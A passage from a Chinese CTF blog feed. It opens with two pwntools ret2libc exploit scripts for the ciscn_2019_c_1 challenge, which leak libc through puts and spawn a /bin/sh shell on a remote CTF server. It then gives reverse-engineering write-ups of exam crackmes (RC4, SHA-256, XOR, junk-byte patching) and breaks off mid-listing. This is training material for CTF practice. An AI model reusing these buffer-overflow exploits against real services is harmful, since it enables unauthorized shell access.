class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"><span class="comment"># 添加retn的地址是为了维护堆栈平衡</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这个脚本也可以运行，两个脚本思路上没有什么区别，只是在第一次发送payload后返回的函数不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 0x4006e0</span></span><br><span class="line">gets_gotplt = elf.got[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x602050</span></span><br><span class="line">vul_fun = elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>] </span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">87</span> +p64(pop_rdi_ret) + p64(gets_gotplt) + p64(puts_plt) + p64(vul_fun)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">re = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_gets = u64(re+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(re)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_gets))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;gets&quot;,libc_gets)</span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_gets - libc.symbols[<span class="string">&#x27;gets&#x27;</span>] <span class="comment"># 0x800b0</span></span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">87</span> +p64(ret)+p64(pop_rdi_ret) + p64(libc_sh) + p64(libc_system)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;755b33e4-bac4-44bb-86ca-ff251d10ae56&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022逆向期末试题</title>
      <link href="/2022/07/re2022/"/>
      <url>/2022/07/re2022/</url>
      
        <content type="html"><![CDATA[<p>这课给分真离谱。</p><h2 id="cpp-1">cpp.1</h2><p>是RC4算法。易得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始密钥0x0FC,0x0FB,0x3B,0x0D,0x73,0x6E</span><br><span class="line">byte_42C700为0x6E,0x65,0x11,0x0CF,0x1D,0x80,0x3B,0x4E,0x20,0x2A,0x0E0,0x0B6,0x0</span><br></pre></td></tr></table></figure><p>使用解密程序进行解密，得到<code>Network</code>。<br>本题需要分析的地方没有结束。先将一些地址信息列在此处。var_1F4为我们加密所得字符串存储的地址，var_64为我们输入的字符串存储的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_64]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">push    0Ch             ; size_t</span><br><span class="line">lea     ecx, [ebp+var_64]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">lea     edx, [ebp+var_C8]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+var_1F4]</span><br><span class="line">push    eax             ; int</span><br><span class="line">lea     ecx, [ebp+var_C8]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    sub_40100A</span><br><span class="line">add     esp, 8</span><br><span class="line">push    7               ; size_t</span><br><span class="line">lea     edx, [ebp+var_58]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_12C]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>下面的代码要求将var_12C处字符串与byte_42C600进行异或，byte_42C600处字符串为<code>Notgood</code>，并使用strcpy将其复制到var_1E8处。var_12C处存储字符串与var_58处存储字符串相同，又因为var_58与var_64地址差12个字节，所以我们可以认为下列代码是对我们输入的字符串从第13字节开始进行处理。var_1E8与var_1F4也差12个字节，所以我们可以知道，var_1F4，即我们加密明文所得的字符串，只保留前12个字节，从第13字节开始，保留的是var_12C处字符串与byte_42C600进行异或的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_25C], 7</span><br><span class="line">jge     short loc_411C98</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">movsx   eax, [ebp+edx+var_12C]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C600[ecx]</span><br><span class="line">xor     eax, edx</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">mov     [ebp+ecx+var_258], al</span><br><span class="line">jmp     short loc_411C53</span><br><span class="line">loc_411C53:</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     [ebp+var_25C], ecx</span><br><span class="line">loc_411C98:             ; size_t</span><br><span class="line">push    7</span><br><span class="line">lea     edx, [ebp+var_258]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">lea     eax, [ebp+var_1E8]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">add     esp, 0Ch</span><br><span class="line">mov     [ebp+var_25C], 0</span><br><span class="line">jmp     short loc_411CCB</span><br></pre></td></tr></table></figure><p>判断的逻辑是要求我们将var_1F4地址处开始的13个字符与byte_42C700的前13个字符进行比较。var_1F4前12字节是RC4加密得到的，我们取出byte_42C700前12个字节进行解密，即我们之前求得的<code>NetworkClass</code>，byte_42C700的第13个字节为0x0，我们将它与byte_42C600第一个字节进行异或，求得我们输入的字符串第13个字符应该为<code>N</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_411CCB:</span><br><span class="line">cmp     [ebp+var_25C], 13h</span><br><span class="line">jge     short loc_411D16</span><br><span class="line">mov     edx, [ebp+var_25C]</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     al, byte ptr [ebp+edx+var_1F4]</span><br><span class="line">mov     ecx, [ebp+var_25C]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42C700[ecx]</span><br><span class="line">cmp     eax, edx</span><br><span class="line">jz      short loc_411D14</span><br></pre></td></tr></table></figure><p>综上，得到flag为<code>NetworkClassN</code>。</p><h2 id="cpp-2">cpp.2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     edx, [ebp+var_444]</span><br><span class="line">push    edx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_454], eax</span><br><span class="line">cmp     [ebp+var_454], 5</span><br><span class="line">jnb     short loc_401D56</span><br></pre></td></tr></table></figure><p>要求输入长度为大于等于5个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">movsx   eax, [ebp+edx+var_444]</span><br><span class="line">cmp     eax, 41h</span><br><span class="line">jl      short loc_401DA5</span><br><span class="line">mov     ecx, [ebp+var_450]</span><br><span class="line">movsx   edx, [ebp+ecx+var_444]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_401DBF</span><br></pre></td></tr></table></figure><p>要求输入的字符再0x41到0x7A的范围内，包含了大小写字母和部分特殊符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdata:0042801C dword_42801C    dd 428A2F98h</span><br><span class="line">.rdata:00428020                 db  91h ; </span><br><span class="line">.rdata:00428021                 db  44h ; D</span><br><span class="line">.rdata:00428022                 db  37h ; 7</span><br><span class="line">.rdata:00428023                 db  71h ; q</span><br></pre></td></tr></table></figure><p>可知为SHA-256。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_444]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_44C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br></pre></td></tr></table></figure><p>说明只对前四个字节进行处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_450]</span><br><span class="line">movsx   ecx, [ebp+eax+var_44]</span><br><span class="line">add     ecx, 1</span><br><span class="line">mov     edx, [ebp+var_450]</span><br><span class="line">mov     [ebp+edx+var_44], cl</span><br><span class="line">jmp     short loc_401E08</span><br></pre></td></tr></table></figure><p>会对所得密文的每一位进行加1操作。<br>所得结果与<code>1f2e28649c4g:25:8bb:24c3D3EGF6GFg22dff</code>进行比较。<br>解的前4字节为<code>Seey</code>，后面需添加至少一个符合输入范围要求的字符。</p><h2 id="cpp-3">cpp.3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     ecx, [ebp+var_14]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">mov     [ebp+var_18], eax</span><br><span class="line">cmp     [ebp+var_18], 8</span><br></pre></td></tr></table></figure><p>要求输入长度为8个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">and     edx, 7Eh</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 80h</span><br><span class="line">sar     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">and     ecx, 1</span><br><span class="line">shl     ecx, 7</span><br><span class="line">or      edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, [ebp+ecx+var_14]</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, byte_429A38[eax]</span><br><span class="line">xor     edx, ecx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">mov     [ebp+eax+var_14], dl</span><br><span class="line">jmp     short loc_401085</span><br></pre></td></tr></table></figure><p>主要逻辑是取出每一字节的最高位和最低位，对两个位进行对调，再与byte_429A38进行异或。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">movsx   ecx, [ebp+eax+var_14]</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">movsx   eax, byte_429A30[edx]</span><br></pre></td></tr></table></figure><p>所得结果与byte_429A30进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte_429A38为0x6,0x7,0x8,0x9,0x0A,0x0B,0x0C,0x0D</span><br><span class="line">byte_429A30为0x52,0x0C7,0x0C2,0x0CD,0x0EE,0x0EB,0x0FE,0x0F5</span><br></pre></td></tr></table></figure><p>解密得flag为<code>TAKEeasy</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x6</span>,<span class="number">0x7</span>,<span class="number">0x8</span>,<span class="number">0x9</span>,<span class="number">0x0A</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x0D</span>]</span><br><span class="line">b = [<span class="number">0x52</span>,<span class="number">0x0C7</span>,<span class="number">0x0C2</span>,<span class="number">0x0CD</span>,<span class="number">0x0EE</span>,<span class="number">0x0EB</span>,<span class="number">0x0FE</span>,<span class="number">0x0F5</span>]</span><br><span class="line">c = []</span><br><span class="line">mid = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">mid = a[i]^b[i]</span><br><span class="line">mid = ((mid &amp; <span class="number">0x80</span>) &gt;&gt; <span class="number">7</span>) | ((mid &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">7</span>) | (mid &amp; <span class="number">0x7E</span>)</span><br><span class="line">c.append(<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br></pre></td></tr></table></figure><h2 id="cpp-4">cpp.4</h2><p>简单的花指令。主要是我比较SB，脑子抽了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmp     dword ptr [ebp-8], 0Eh</span><br><span class="line">jge     short loc_4010F5</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">xor     edx, 0FFh</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">mov     byte_42CCBC[eax], dl</span><br><span class="line">mov     ecx, [ebp-8]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, byte_42CCBC[ecx]</span><br><span class="line">mov     eax, [ebp-8]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, byte_429A30[eax]</span><br><span class="line">sub     edx, ecx</span><br><span class="line">mov     eax, [ebp-4]</span><br><span class="line">add     eax, edx</span><br><span class="line">mov     [ebp-4], eax</span><br><span class="line">jmp     short loc_4010AA</span><br></pre></td></tr></table></figure><p>主要逻辑是将42CCBC处（根据前面的代码可以很容易的分析出这里存储的是我们输入的字符串）先取反（与0xFF异或的等价操作，我分析的时候没有看到）与429A30处字符串相减。将结果存入var_4中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">429A30处字符串为0xBD,0x9A,0x9E,0x8B,0xD5,0xCF,0x92,0x96,0x9C,0x8D,0x90,0x91,0xD5,0xDE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> loc_4010F5:</span><br><span class="line">.text:004010F5 33 C0              xor     eax, eax</span><br><span class="line">.text:004010F7 74 03              jz      short near ptr loc_4010FB+1</span><br><span class="line">.text:004010F9 75 00              jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB  loc_4010FB:</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB E9 83 7D FC 00     jmp     near ptr 13C8E83h</span><br></pre></td></tr></table></figure><p>0x4010FB处jmp指令指向一个无效地址。0x4010F7的jz指令是跳转到0x4010FB的下一字节，因为xor eax,eax语句计算结果恒为零，所以jz跳转一定会发生，而我们程序执行结果不变的情况下，很容易看出0x4010FB处的一个字节是垃圾数据，只需要将其nop掉即可。我们直接通过Patch将0x4010FB处的一个字节修改为90，从而将其修改为nop。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:004010F5 33 C0         xor     eax, eax</span><br><span class="line">.text:004010F7 74 03         jz      short loc_4010FC</span><br><span class="line">.text:004010F9 75 00         jnz     short $+2</span><br><span class="line">.text:004010FB</span><br><span class="line">.text:004010FB                         </span><br><span class="line">loc_4010FB:</span><br><span class="line">.text:004010FB 90            nop</span><br><span class="line">.text:004010FC</span><br><span class="line">.text:004010FC                         </span><br><span class="line">loc_4010FC:</span><br><span class="line">.text:004010FC 83 7D FC 00   cmp     dword ptr [ebp-4], 0</span><br><span class="line">.text:00401100 75 0F         jnz     short loc_401111</span><br></pre></td></tr></table></figure><p>修改后的代码如上。对于<code>cmp     dword ptr [ebp-4], 0</code>这条语句，我本来准备直接爆破，后来发现字符串直接取反就行了（乐）。<br>flag为<code>Beat*0micron*!</code>。</p><h2 id="cpp-5">cpp.5</h2><p>如果用ida的graph view很容易看出是异常处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loc_4014AC:</span><br><span class="line">cmp     [ebp+var_1C], 5</span><br><span class="line">jge     short loc_4014F6</span><br><span class="line">loc_4014F6:</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">mov     ecx, [ebp+var_1C]</span><br><span class="line">sub     ecx, 5</span><br><span class="line">mov     eax, 1</span><br><span class="line">cdq</span><br><span class="line">idiv    ecx</span><br><span class="line">test    eax, eax</span><br><span class="line">jz      short loc_40151E</span><br></pre></td></tr></table></figure><p>jge进行跳转，当jge初次跳转时，var_1C处值为5，ecx减去5后为0，调用除法指令会出现除零异常。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_14]</span><br><span class="line">movsx   eax, byte_42CD78[edx]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_4013A4</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, byte_42CD78[ecx]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jg      short loc_4013A4</span><br><span class="line">mov     [ebp+var_18], 61h</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">movsx   ecx, byte_42CD78[eax]</span><br><span class="line">sub     ecx, [ebp+var_18]</span><br><span class="line">mov     [ebp+var_1C], ecx</span><br><span class="line">mov     eax, [ebp+var_1C]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_1C], edx</span><br><span class="line">mov     edx, [ebp+var_1C]</span><br><span class="line">add     edx, [ebp+var_18]</span><br><span class="line">mov     eax, [ebp+var_14]</span><br><span class="line">mov     byte_42CD78[eax], dl</span><br><span class="line">loc_4013A4:</span><br><span class="line">mov     ecx, [ebp+var_14]</span><br><span class="line">movsx   edx, 